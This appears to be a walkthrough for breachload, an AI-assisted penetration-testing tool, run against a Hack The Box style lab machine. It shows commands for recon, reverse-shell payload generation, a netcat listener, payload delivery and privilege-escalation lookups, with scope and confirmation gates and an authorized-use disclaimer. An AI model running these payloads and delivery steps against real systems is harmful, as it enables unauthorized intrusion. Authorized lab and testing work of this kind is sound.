# Walkthrough — a box from start to finish

A practical, end-to-end run against a single lab machine (Hack The Box style).
Everything here works **without an API key** — the LLM only makes the planner
smarter; the offline library, the rule-based suggestion engine, the attack
chains, and the reports all run locally.

> For authorized testing only. You are responsible for having permission to test
> every target in scope.

---

## 0. Prerequisites

breachload orchestrates external tools; it does not bundle them. Run it from a
Linux attack box (Kali / WSL2 / HTB Pwnbox) where the scanners live:

```bash
sudo apt install -y nmap whatweb ffuf seclists enum4linux-ng metasploit-framework
```

```bash
git clone https://github.com/Noxiidus/breachload && cd breachload
python3 -m venv .venv && . .venv/bin/activate && pip install -e '.[web]'
```

Check what's actually available (missing tools are skipped gracefully):

```bash
breachload doctor
```

## 1. Connect and define scope

Connect the VPN, note your `tun0` IP (used later as `LHOST`), and grab the target
IP. Then write the engagement — the `targets` list is the hard scope boundary;
breachload never touches anything outside it.

`engagements/box.yaml`:

```yaml
name: box
mode: full-auto
ctf: true
targets:
  - 10.10.11.123     # the target
auto_threshold: active
min_action_interval: 0.5
```

Optional: `export ANTHROPIC_API_KEY=...` for the smarter planner (offline
heuristic otherwise).

## 2. Recon → analysis → plan → report, in one command

```bash
breachload auto engagements/box.yaml --lhost 10.10.14.9
```

This runs recon → enumeration → vuln scanning (nmap, whatweb, ffuf, nuclei,
enum4linux-ng), folds in CVE matches and cross-service correlations, then prints
a prioritized **attack plan** and writes `engagements/box/report.md` (+ PDF).

Prefer to watch it live and approve risky steps in a browser?

```bash
breachload serve engagements/box.yaml    # dashboard on http://127.0.0.1:8000
```

## 3. Read the plan

```bash
breachload status engagements/box.yaml     # hosts, services, findings, creds
breachload suggest engagements/box.yaml --lhost 10.10.14.9
```

`suggest` orders steps by payoff: matched **attack chains** first (e.g. "MS17-010
EternalBlue" for legacy Windows SMB, "Tomcat manager WAR deploy", "Anonymous
FTP"), then per-CVE exploitation, then per-service quick wins, then post-shell
privilege escalation — every command pre-filled with your target and `LHOST`.

Browse the offline payload library any time (no config needed):

```bash
breachload payloads --tag shell
breachload payloads --show rev-python --lhost 10.10.14.9 --lport 4444
```

## 4. Exploit (assisted, confirm-gated)

Generation is offline and unrestricted; **delivery is scope- and
confirmation-gated**. Typical loop:

```bash
breachload poc engagements/box.yaml --index 0                    # PoC for a finding
breachload payload engagements/box.yaml \
    --payload linux/x64/shell_reverse_tcp --lhost 10.10.14.9 --lport 4444 --fmt elf
nc -lvnp 4444                                                    # your listener
breachload deliver engagements/box.yaml --artifact <name> --target 10.10.11.123 --listen
```

Often you'll deliver through the box's own vector (upload, web RCE); either way
breachload keeps a record of everything you generated and ran.

## 5. Escalate

Once you have a shell, stabilise it and hunt for a path to root. Found a SUID
binary or a `sudo -l` entry? Look it up offline:

```bash
breachload gtfo find
breachload gtfo python3
```

## 6. Flags and the report

```bash
breachload flag engagements/box.yaml --scan loot/user.txt      # capture a flag
breachload report engagements/box.yaml --pdf                    # final report
```

The report has an executive summary, host/service inventory, findings by severity
with **reproduction steps** pulled from the run history, credentials, generated
artifacts, captured flags, and a full activity timeline.

---

## Extending it

- **Grow the CVE knowledge base** from an NVD 2.0 feed:

  ```bash
  breachload kb-import nvdcve.json --output mykb.json
  export BREACHLOAD_KB=$(pwd)/mykb.json
  ```

- **Add your own tool** without patching breachload — register a `ToolAdapter`
  under the `breachload.tools` entry-point group in your package's
  `pyproject.toml`:

  ```toml
  [project.entry-points."breachload.tools"]
  my_scanner = "my_pkg.adapters:MyScannerAdapter"
  ```

  Its binary is added to the validator's allowlist automatically; a broken plugin
  is logged and skipped, and it can never shadow a built-in adapter.
